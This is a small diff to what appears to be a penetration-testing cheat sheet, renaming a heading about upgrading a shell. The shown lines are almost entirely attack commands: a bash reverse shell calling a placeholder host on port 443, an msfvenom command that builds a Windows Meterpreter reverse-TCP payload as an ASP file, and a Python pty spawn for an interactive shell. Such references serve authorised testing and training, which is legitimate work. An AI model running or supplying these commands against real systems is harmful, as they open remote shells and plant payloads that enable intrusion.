@@ -20,7 +20,7 @@ bash -i >&/dev/tcp/x.x.x.x/443 0>&1
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f asp > msfshell.asp
 ```
 
-## Pretty bash TTY
+## Interactive shell upgrade
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/sh")'
